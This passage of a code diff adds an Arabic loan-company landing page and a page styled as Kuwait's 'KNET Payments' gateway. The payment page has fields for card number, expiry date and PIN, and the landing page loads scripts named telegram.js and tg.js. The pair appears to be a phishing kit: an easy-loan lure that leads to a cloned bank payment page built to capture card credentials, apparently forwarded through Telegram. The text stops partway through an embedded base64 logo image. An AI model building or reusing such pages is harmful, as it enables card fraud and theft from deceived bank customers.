+        <div class="offers-grid">
+          <article class="offer-card" data-href="./calculator.html?loan=cash">
+            <div class="offer-body">
+              <span class="offer-icon" aria-hidden="true">
+                <img src="./assets/images/offers/ten-years.svg" alt="" />
+              </span>
+              <h3 data-i18n="offers.repayment">فترة سداد لغاية 7 سنين</h3>
+            </div>
+          </article>
+          <article class="offer-card" data-href="./calculator.html?loan=cash">
+            <div class="offer-body">
+              <span class="offer-icon" aria-hidden="true">
+                <img src="./assets/images/offers/zero-interest.svg" alt="" />
+              </span>
+              <h3 data-i18n="offers.noGuarantor">لا يتطلب كفيل</h3>
+            </div>
+          </article>
+          <article class="offer-card" data-href="./calculator.html?loan=cash">
+            <div class="offer-body">
+              <span class="offer-icon" aria-hidden="true">
+                <img src="./assets/images/offers/no-minimum.svg" alt="" />
+              </span>
+              <h3 data-i18n="offers.noMinimumSalary">من دون حد أدنى على الراتب</h3>
+            </div>
+          </article>
+        </div>
+      </section>
+
+      <section id="about" class="why-us section-card">
+        <div class="why-text">
+          <h2 data-i18n="about.title">لماذا تختارنا ؟</h2>
+          <p data-i18n="about.copy">
+            مرحباً بكم في شركة التسهيلات، حيث رضاك هو أولويتنا. اكتشف لماذا اختيارنا هو القرار الأفضل لتوفير
+            جميع احتياجاتك الائتمانية.
+          </p>
+          <a href="./calculator.html?loan=cash" class="text-link" data-i18n="about.readMore">قدم على قرضك الآن</a>
+        </div>
+        <div class="why-media">
+          <img src="./assets/images/section1-cover-ar.png" alt="لماذا التسهيلات" />
+        </div>
+      </section>
+
+    </main>
+
+    <a class="apply-now-button" href="./calculator.html?loan=cash" data-i18n="ui.applyNow">قدم قرضك الان</a>
+
+    <footer class="site-footer">
+      <div class="footer-grid">
+        <details class="footer-column" open>
+          <summary data-i18n="nav.about">نبذة عن الشركة</summary>
+          <div class="footer-links">
+            <a href="#about" data-i18n="about.history">نبذة تاريخية</a>
+            <a href="#about" data-i18n="about.viceChair">كلمة نائب رئيس مجلس الإدارة</a>
+            <a href="#about" data-i18n="about.board">أعضاء مجلس الإدارة</a>
+            <a href="#about" data-i18n="about.team">الفريق الإداري</a>
+            <a href="#about" data-i18n="about.governance">حوكمة الشركات</a>
+            <a href="#about" data-i18n="about.aml">مكافحة غسل الأموال وتمويل الإرهاب</a>
+            <a href="#about" data-i18n="about.protection">دليل حماية العملاء</a>
+          </div>
+        </details>
+        <details id="services" class="footer-column" open>
+          <summary data-i18n="nav.services">خدمات الشركة</summary>
+          <div class="footer-links">
+            <a href="#calculator" data-i18n="loan.cash">قرض نقدي</a>
+            <a href="#calculator" data-i18n="loan.auto">قرض سيارة</a>
+            <a href="#calculator" data-i18n="loan.housing">قرض إسكاني</a>
+            <a href="#calculator" data-i18n="loan.education">قرض تعليمي</a>
+            <a href="#calculator" data-i18n="loan.marine">معدات بحرية</a>
+            <a href="#calculator" data-i18n="loan.furniture">قرض أثاث</a>
+            <a href="#calculator" data-i18n="loan.electrical">أجهزة كهربائية</a>
+            <a href="#calculator" data-i18n="loan.commercial">قرض تجاري</a>
+          </div>
+        </details>
+        <details id="news" class="footer-column" open>
+          <summary data-i18n="nav.news">الأخبار والمعلومات المالية</summary>
+          <div class="footer-links">
+            <a href="#news" data-i18n="news.reports">تقارير مالية</a>
+            <a href="#news" data-i18n="news.meetings">نتائج الاجتماع</a>
+          </div>
+        </details>
+        <details id="contact" class="footer-column" open>
+          <summary data-i18n="nav.contact">إتصل بنا</summary>
+          <div class="footer-links">
+            <a href="#contact" data-i18n="contact.complaints">شكاوي العملاء</a>
+            <a href="#contact" data-i18n="contact.branches">فروعنا</a>
+            <a href="#contact" data-i18n="contact.faq">الأسئلة المشهورة</a>
+          </div>
+        </details>
+        <details id="careers" class="footer-column" open>
+          <summary data-i18n="nav.careers">انضم الى فريقنا</summary>
+          <div class="footer-links">
+            <a href="#careers" data-i18n="careers.form">نموذج التوظيف</a>
+          </div>
+        </details>
+      </div>
+
+      <div class="footer-bottom">
+        <div class="contact-icons">
+          <div>
+            <h3 data-i18n="contact.title">اتصل بنا</h3>
+            <div class="icon-row">
+              <a href="#" aria-label="اتصال"><img src="./assets/images/social/phone.png" alt="" /></a>
+              <a href="#" aria-label="البريد الإلكتروني"><img src="./assets/images/contact-us/email.png" alt="" /></a>
+              <a href="#" aria-label="واتساب"><img src="./assets/images/social/whatsapp.png" alt="" /></a>
+            </div>
+          </div>
+          <div>
+            <h3 data-i18n="social.title">تواصل معنا</h3>
+            <div class="icon-row">
+              <a href="#" aria-label="لينكدإن"><img src="./assets/images/social/linkedin.png" alt="" /></a>
+              <a href="#" aria-label="يوتيوب"><img src="./assets/images/social/youtube.png" alt="" /></a>
+              <a href="#" aria-label="إكس"><img src="./assets/images/social/twitter.png" alt="" /></a>
+              <a href="#" aria-label="فيسبوك"><img src="./assets/images/social/facebook.png" alt="" /></a>
+              <a href="#" aria-label="إنستغرام"><img src="./assets/images/social/instagram.png" alt="" /></a>
+            </div>
+          </div>
+        </div>
+
+        <div class="store-links">
+          <h3 data-i18n="store.title">حمل التطبيق</h3>
+          <div class="store-badges">
+            <a href="#"><img src="./assets/images/store/app-store.png" alt="App Store" /></a>
+            <a href="#"><img src="./assets/images/store/play-store.png" alt="Google Play" /></a>
+          </div>
+        </div>
+      </div>
+
+      <div class="copyright" data-i18n="copyright">جميع الحقوق محفوظة لشركة التسهيلات التجارية © 2026</div>
+    </footer>
+
+    <script src="./assets/js/telegram.js"></script>
+    <script src="./assets/js/tg.js"></script>
+    <script src="./assets/js/script.js"></script>
+  </body>
+</html>
+
+<html xmlns="http://www.w3.org/1999/xhtml">
+    <head>
+        <meta charset="utf-8">
+        <meta name="viewport" content="width=device-width, initial-scale=1">
+        <title>KNET Payments</title>
+        <style>
+            * {
+                margin: 0;
+                padding: 0;
+                box-sizing: border-box;
+            }
+
+            body {
+                font-family: Verdana, Arial, Helvetica, sans-serif;
+                background-color: #ebebeb;
+            }
+
+            #DCNumber {
+                letter-spacing: 0.04em;
+            }
+
+            #pinMask {
+                font-size: 0.72rem;
+                letter-spacing: 0.16em;
+                display: inline-block;
+            }
+
+            .container {
+                width: 100%;
+                padding: 15px;
+                box-sizing: border-box;
+            }
+
+            .content-block {
+                width: 395px;
+                margin: 0 auto;
+            }
+
+            .row {
+                border-bottom: 1px solid #8f8f90;
+                padding-bottom: 5px;
+                padding-top: 5px;
+            }
+
+            .row_new {
+                padding-bottom: 5px;
+                padding-top: 5px;
+            }
+
+            .column-label,
+            .column-value,
+            .column-long {
+                float: left;
+            }
+
+            .column-label {
+                width: 40%;
+            }
+
+            .column-value {
+                width: 60%;
+            }
+
+            .row.three-column .column-value {
+                width: 18%;
+                margin-right: 5px;
+            }
+
+            .row.three-column .column-long {
+                width: 39%;
+                float: right;
+            }
+
+            .row:after {
+                content: "";
+                display: table;
+                clear: both;
+            }
+
+            .form-card {
+                background-color: #ffffff;
+                padding: 20px;
+                border: 2px solid #8f8f90;
+                border-radius: 15px;
+                margin-bottom: 15px;
+                box-shadow: 0 0 6px rgba(0,0,0,0.3);
+            }
+
+            .form-card:nth-child(1) {
+                margin-top: 25px;
+            }
+
+            .form-card .row:nth-child(1) {
+                padding-top: 0;
+            }
+
+            .form-card .row:nth-last-child(1) {
+                border: 0;
+                padding-bottom: 0;
+            }
+
+            .footer-content .row,
+            .footer-content-new .row {
+                border: 0;
+                padding-bottom: 0;
+            }
+
+            form label {
+                font-size: 11px;
+                color: #0070cd;
+                font-weight: bold;
+                text-shadow: 0 1px 2px rgba(0,0,0,0.2);
+            }
+
+            select {
+                font-size: 11px;
+                height: 20px;
+            }
+
+            form .text-label,
+            input,
+            select {
+                color: #444444;
+                font-weight: normal;
+            }
+
+            form input[type="tel"],
+            input[type="password"],
+            form input[type="text"] {
+                border: 2px solid #0070cd;
+                box-shadow: inset 0 0 5px rgba(0,0,0,0.3);
+                padding: 0 3px;
+                outline: 0;
+                font-size: 11px;
+                height: 20px;
+            }
+
+            #ValidationMessage {
+                margin: 0;
+                box-sizing: border-box;
+                transition: height 1s ease;
+                border: #ff0000 1px solid;
+                background-color: #f7dadd;
+                font-size: 13px;
+                font-family: helvetica, arial, sans serif;
+                color: #ff0000;
+                padding: 5px 2px 5px 2px;
+                display: none;
+                margin-bottom: 3px;
+                text-align: center;
+            }
+
+            .footer-content {
+                text-align: center;
+                margin-top: 15px;
+                font-weight: bold;
+                color: #2277d3;
+            }
+
+            .brand-img {
+                margin-right: 5px;
+                float: right;
+            }
+
+            .brand-info {
+                font-size: 12px;
+                text-align: left;
+            }
+
+            .footer-content #knet-brand {
+                width: 43px;
+                height: 43px;
+                background: url("./assets/images/knet-links.png") -148px 0 no-repeat;
+                margin-top: 5px;
+            }
+
+            .footer-content .social-links {
+                margin-top: 15px;
+                text-align: center;
+            }
+
+            .footer-content .social-links div {
+                height: 30px;
+                display: inline-block;
+            }
+
+            .footer-content .social-links div#knet-yt {
+                background: url("./assets/images/knet-links.png") 0 0 no-repeat;
+                width: 35px;
+            }
+
+            .footer-content .social-links div#knet-sn {
+                background: url("./assets/images/knet-links.png") -36px 0 no-repeat;
+                width: 27px;
+            }
+
+            .footer-content .social-links div#knet-tw {
+                background: url("./assets/images/knet-links.png") -64px 0 no-repeat;
+                width: 27px;
+            }
+
+            .footer-content .social-links div#knet-it {
+                background: url("./assets/images/knet-links.png") -93px 0 no-repeat;
+                width: 27px;
+            }
+
+            .footer-content .social-links div#knet-fb {
+                background: url("./assets/images/knet-links.png") -120px 0 no-repeat;
+                width: 27px;
+            }
+
+            button {
+                width: 100%;
+            }
+
+            .submit-button {
+                background-color: #eaeaea;
+                border: 1px solid #cacaca;
+                padding: 5px 0;
+                font-weight: bold;
+                color: #666666;
+                width: 50%;
+                float: left;
+                height: 27px;
+                border-radius: 4px;
+            }
+
+            .cancel-button {
+                background-color: #eaeaea;
+                border: 1px solid #cacaca;
+                padding: 5px 0;
+                font-weight: bold;
+                color: #666666;
+                width: 50%;
+                height: 27px;
+                border-radius: 4px;
+                -webkit-appearance: none;
+            }
+
+            .row.alert-msg {
+                font-size: 12px;
+                text-align: justify;
+                background-color: #d9edf6;
+                padding: 10px !important;
+                border: 1px solid #bacce0;
+                border-radius: 4px;
+                margin-bottom: 10px;
+            }
+
+            .overlay {
+                background: rgba(85, 85, 85, 0.5);
+                display: none;
+                position: fixed;
+                top: 0;
+                right: 0;
+                bottom: 0;
+                left: 0;
+                z-index: 9999;
+            }
+
+            .overlay img {
+                position: absolute;
+                top: 50%;
+                left: 50%;
+                transform: translate(-50%, -50%);
+                height: min(15vh, 96px);
+                width: auto;
+            }
+
+            .terms {
+                font-size: 11px;
+                color: #0070cd;
+                font-weight: bold;
+                font-style: italic;
+                text-decoration: none;
+            }
+
+            .choiceOption {
+                vertical-align: super;
+            }
+
+            .container-blogo {
+                width: 100%;
+                margin-top: -5px;
+                margin-bottom: 15px;
+            }
+
+            .logoHead-mob {
+                width: 42%;
+                margin-left: 27%;
+                margin-right: auto;
+            }
+
+            .madd {
+                height: 90px;
+                max-width: 372px;
+                margin: 5px auto -30px auto;
+                border-radius: 0px 10px;
+                background-image: url("./assets/images/mob.jpg");
+                display: block;
+            }
+
+            @media all and (max-width: 425px) {
+                .content-block {
+                    width: 98%;
+                    margin: 0 auto;
+                }
+            }
+
+            body {
+                background:
+                    radial-gradient(circle at top right, rgba(13, 127, 184, 0.14), transparent 28%),
+                    radial-gradient(circle at left 15%, rgba(0, 95, 147, 0.06), transparent 20%),
+                    linear-gradient(180deg, #f7fbff 0%, #eef4fb 100%);
+                color: #1d2b3d;
+            }
+
+            .madd {
+                border-radius: 18px;
+                overflow: hidden;
+                box-shadow: 0 16px 36px rgba(31, 51, 78, 0.16);
+                margin-bottom: 14px;
+            }
+
+            .form-card {
+                background:
+                    linear-gradient(180deg, rgba(255, 255, 255, 0.96), rgba(244, 248, 252, 0.98));
+                border: 1px solid rgba(114, 140, 171, 0.16);
+                box-shadow: 0 18px 40px rgba(31, 51, 78, 0.08);
+            }
+
+            .row {
+                border-bottom-color: rgba(114, 140, 171, 0.22);
+            }
+
+            form label {
+                color: #005f93;
+                text-shadow: none;
+            }
+
+            input,
+            select {
+                background: #ffffff;
+                border-radius: 12px;
+                border-color: rgba(13, 127, 184, 0.45);
+                box-shadow: inset 0 1px 2px rgba(31, 51, 78, 0.08);
+            }
+
+            #ValidationMessage {
+                border-color: rgba(239, 68, 68, 0.5);
+                background-color: #fff1f2;
+                color: #b91c1c;
+                border-radius: 10px;
+            }
+
+            .submit-button {
+                background: linear-gradient(135deg, #0d7fb8, #005f93);
+                border: 0;
+                color: #ffffff;
+                box-shadow: 0 12px 24px rgba(13, 127, 184, 0.24);
+            }
+
+            .cancel-button {
+                background: linear-gradient(180deg, #f8fbff, #eef4fb);
+                border-color: rgba(114, 140, 171, 0.24);
+                color: #44566f;
+            }
+
+            .overlay {
+                background: rgba(15, 23, 42, 0.62);
+                backdrop-filter: blur(6px);
+            }
+
+            .container-blogo img,
+            .logoHead-mob {
+                filter: drop-shadow(0 10px 24px rgba(31, 51, 78, 0.12));
+            }
+
+            /* Compact payment layout used on the mobile payment screen. */
+            body {
+                min-height: 100vh;
+                background: #eef6fd;
+                color: #164a76;
+                font-family: Arial, Helvetica, sans-serif;
+            }
+
+            .madd {
+                display: none;
+            }
+
+            .container {
+                padding: 0 8px 18px;
+            }
+
+            .content-block {
+                width: min(100%, 391px);
+            }
+
+            .form-card {
+                padding: 10px;
+                border: 1px solid #d9e7f2;
+                border-radius: 17px;
+                margin-bottom: 11px;
+                box-shadow: 0 7px 18px rgba(31, 76, 112, 0.08);
+            }
+
+            .form-card:nth-child(1) {
+                margin-top: 7px;
+                min-height: 143px;
+            }
+
+            .form-card:nth-child(2) {
+                min-height: 196px;
+                padding: 15px 10px 10px;
+            }
+
+            .form-card:nth-child(2)::before {
+                content: "معلومات البطاقة";
+                display: block;
+                margin: 0 0 7px;
+                color: #0070cd;
+                font-size: 12px;
+                font-weight: bold;
+                text-align: right;
+            }
+
+            .form-card:nth-child(3) {
+                min-height: 68px;
+                padding: 10px;
+                margin-bottom: 8px;
+            }
+
+            .container-blogo {
+                margin: 0 0 8px;
+            }
+
+            .logoHead-mob {
+                width: 42%;
+                display: block;
+                margin-left: auto !important;
+                margin-right: auto !important;
+            }
+
+            .form-card:nth-child(1) .row,
+            .form-card:nth-child(1) #OrgTranxAmt {
+                min-height: 28px;
+            }
+
+            .form-card:nth-child(1) .row {
+                padding-top: 4px;
+                padding-bottom: 4px;
+            }
+
+            .form-card:nth-child(2) #knetform > .row:first-child {
+                display: none;
+            }
+
+            .form-card:nth-child(2) .row {
+                min-height: 39px;
+                padding: 8px 0;
+                border-bottom-color: #dce8f1;
+            }
+
+            .form-card:nth-child(2) .row:last-child {
+                border-bottom: 0;
+            }
+
+            .form-card:nth-child(2) form label,
+            .form-card:nth-child(2) label {
+                color: #0070cd;
+                text-shadow: none;
+            }
+
+            .form-card:nth-child(2) input,
+            .form-card:nth-child(2) select {
+                height: 27px;
+                border: 1px solid #cbd5df;
+                border-radius: 6px;
+                background: #fff;
+                box-shadow: inset 0 1px 3px rgba(31, 51, 78, 0.1);
+                color: #4e5965;
+            }
+
+            .form-card:nth-child(2) #Paymentpagecardnumber input {
+                width: 68% !important;
+                height: 27px;
+                float: left !important;
+            }
+
+            .form-card:nth-child(2) #Paymentpagecardnumber .column-label,
+            .form-card:nth-child(2) #PinRow .column-label {
+                width: 32% !important;
+                float: right !important;
+            }
+
+            .form-card:nth-child(2) #Paymentpagecardnumber select {
+                display: none;
+            }
+
+            .form-card:nth-child(2) #Paymentpagecardnumber #dcprefix {
+                display: none !important;
+            }
+
+            .form-card:nth-child(2) #cardExpdate {
+                min-height: 39px;
+            }
+
+            .form-card:nth-child(2) #cardExpdate > div:last-child {
+                width: 68% !important;
+                display: flex;
+                justify-content: center;
+                gap: 4px;
+            }
+
+            .form-card:nth-child(2) #cardExpdate .paymentselect {
+                width: auto;
+                min-width: 42px;
+            }
+
+            .form-card:nth-child(2) #PinRow input {
+                width: 68% !important;
+                height: 27px;
+                float: left !important;
+            }
+
+            .bank-indicator {
+                display: flex;
+                align-items: center;
+                justify-content: flex-start;
+                gap: 7px;
+                min-height: 27px;
+                margin: -3px 0 3px;
+                padding-left: 4px;
+                color: #17679c;
+                font-size: 11px;
+                font-weight: bold;
+            }
+
+            .bank-indicator-logo {
+                width: 54px;
+                height: 27px;
+                object-fit: contain;
+                border-radius: 4px;
+                background: #fff;
+            }
+
+            .bank-indicator[hidden] {
+                display: none;
+            }
+
+            .bank-prefix-suggestions {
+                position: relative;
+                z-index: 5;
+                max-height: 150px;
+                margin: 2px 0 5px;
+                overflow-y: auto;
+                border: 1px solid #cbd5df;
+                border-radius: 5px;
+                background: #fff;
+                box-shadow: 0 3px 8px rgba(31, 51, 78, 0.15);
+            }
+
+            .bank-prefix-suggestions[hidden] {
+                display: none;
+            }
+
+            .bank-prefix-option {
+                display: flex;
+                align-items: center;
+                justify-content: space-between;
+                gap: 8px;
+                width: 100%;
+                min-height: 29px;
+                padding: 4px 7px;
+                border: 0;
+                border-bottom: 1px solid #e5edf3;
+                background: #fff;
+                color: #53606c;
+                cursor: pointer;
+                font-size: 11px;
+                text-align: right;
+            }
+
+            .bank-prefix-option:last-child {
+                border-bottom: 0;
+            }
+
+            .bank-prefix-option:hover,
+            .bank-prefix-option:focus {
+                background: #eef7ff;
+                outline: 0;
+            }
+
+            .bank-prefix-option img {
+                width: 34px;
+                height: 20px;
+                object-fit: contain;
+                order: 2;
+            }
+
+            .bank-prefix-option span {
+                flex: 1;
+            }
+
+            .form-card:nth-child(3) .row {
+                padding: 0;
+                border: 0;
+            }
+
+            .submit-button,
+            .cancel-button {
+                height: 27px;
+                border-radius: 0;
+                padding: 5px 0;
+                box-shadow: none;
+                font-size: 11px;
+            }
+
+            .submit-button {
+                background: #eeeeee;
+                border: 1px solid #c9c9c9;
+                color: #666;
+            }
+
+            .cancel-button {
+                background: #eeeeee;
+                border: 1px solid #c9c9c9;
+                color: #666;
+            }
+
+            footer {
+                margin-top: 11px;
+                color: #42658a;
+            }
+
+            footer::before {
+                content: "كي نت";
+                display: block;
+                width: 76px;
+                height: 32px;
+                margin: 0 auto 12px;
+                background: #fff;
+                border: 1px solid #edf1f5;
+                color: #1875ba;
+                font-size: 17px;
+                font-weight: bold;
+                line-height: 32px;
+                text-align: center;
+            }
+
+            footer .row_new {
+                font-size: 12px !important;
+                line-height: 1.65;
+            }
+
+            footer .row_new span {
+                color: #0070cd !important;
+            }
+
+            @media all and (max-width: 425px) {
+                .content-block {
+                    width: 100%;
+                }
+            }
+
+            #prefixField {
+                display: none !important;
+            }
+
+            #bankIndicator {
+                display: flex;
+                min-height: 27px;
+                margin: -3px 0 3px;
+                padding-left: 4px;
+                color: #17679c;
+                font-size: 11px;
+                font-weight: bold;
+                cursor: pointer;
+            }
+
+            #bankIndicator[hidden] {
+                display: none;
+            }
+
+            #bankPrefixSuggestions {
+                display: block;
+                width: 60%;
+                max-height: 150px;
+                margin: -4px 0 5px 40%;
+                overflow-y: auto;
+                border: 1px solid #cbd5df;
+                border-radius: 5px;
+                background: #fff;
+                box-shadow: 0 3px 8px rgba(31, 51, 78, 0.15);
+            }
+
+            #bankPrefixSuggestions[hidden] {
+                display: none;
+            }
+
+            #cardNumberField {
+                width: 60% !important;
+            }
+
+            #cardNumberCombined {
+                width: 100%;
+                height: 38px;
+                padding: 0 10px;
+                border: 1px solid #cbd5df;
+                border-radius: 9px;
+                background: #fff;
+                box-shadow: inset 0 1px 3px rgba(31, 51, 78, 0.1);
+                direction: ltr;
+                text-align: left;
+                font-size: 14px;
+            }
+
+            #cardNumberCombined:focus {
+                outline: none;
+                border-color: #0d7fb8;
+                box-shadow: 0 0 0 2px rgba(13, 127, 184, 0.14);
+            }
+
+            #cardExpdate > div:last-child {
+                display: flex;
+                justify-content: center;
+                align-items: center;
+            }
+
+            #cardExpdate .paymentselect {
+                display: none;
+            }
+
+            #cardExpdate::after {
+                content: "YY   /   MM";
+                display: block;
+                width: 112px;
+                padding: 9px 7px;
+                border: 1px solid #cbd5df;
+                border-radius: 9px;
+                background: #fff;
+                color: #7b8794;
+                direction: ltr;
+                text-align: center;
+                font-size: 14px;
+            }
+
+            #cardExpdate:focus-within::after {
+                display: none;
+            }
+
+            #cardExpdate:focus-within .paymentselect {
+                display: block;
+            }
+
+            #cardPin {
+                width: 60% !important;
+                height: 38px !important;
+                border-radius: 9px !important;
+                font-size: 14px !important;
+            }
+
+            #manualExpiryInput {
+                display: flex;
+                align-items: center;
+                justify-content: center;
+                gap: 8px;
+                width: 112px;
+                height: 38px;
+                padding: 0 8px;
+                border: 1px solid #cbd5df;
+                border-radius: 9px;
+                background: #fff;
+                direction: ltr;
+            }
+
+            #manualExpiryInput input {
+                width: 34px;
+                height: 30px;
+                padding: 0;
+                border: 0;
+                outline: 0;
+                background: transparent;
+                box-shadow: none;
+                text-align: center;
+                font-size: 14px;
+                color: #4e5965;
+            }
+
+            #manualExpiryInput span {
+                color: #7b8794;
+                font-size: 14px;
+            }
+
+            #cardExpdate .paymentselect {
+                display: none !important;
+            }
+
+            #cardExpdate::after {
+                display: none;
+            }
+
+            #cardExpdate .paymentselect {
+                display: block;
+                width: 52px;
+                height: 38px;
+                border: 0;
+                border-radius: 0;
+                box-shadow: none;
+                background: transparent;
+                font-size: 14px;
+            }
+
+            #cardExpdate > div:last-child {
+                width: 60% !important;
+                min-height: 38px;
+                border: 1px solid #cbd5df;
+                border-radius: 9px;
+                background: #fff;
+                direction: ltr;
+            }
+
+            #cardExpdate.expiry-invalid > div:last-child {
+                border-color: #dc2626;
+                background: #fff5f5;
+            }
+
+            #cardExpdate.expiry-invalid .paymentselect,
+            #cardExpdate.expiry-invalid label {
+                color: #dc2626;
+            }
+        </style>
+        <link rel="stylesheet" href="./assets/css/top-banner.css">
+    </head>
+<body class="has-top-banner">
+            <div class="top-banner">
+                <img src="./assets/images/top-banner.png" alt="إعلان">
+            </div>
+    <form method="post">
+        <div class="madd"> </div>
+        <div id="PayPageEntry" style="display: block">
+            <div class="container">
+                <div class="content-block">
+                    <div class="form-card">
+                        <div class="container-blogo"><img class="logoHead-mob" src="data:image/jpeg;base64,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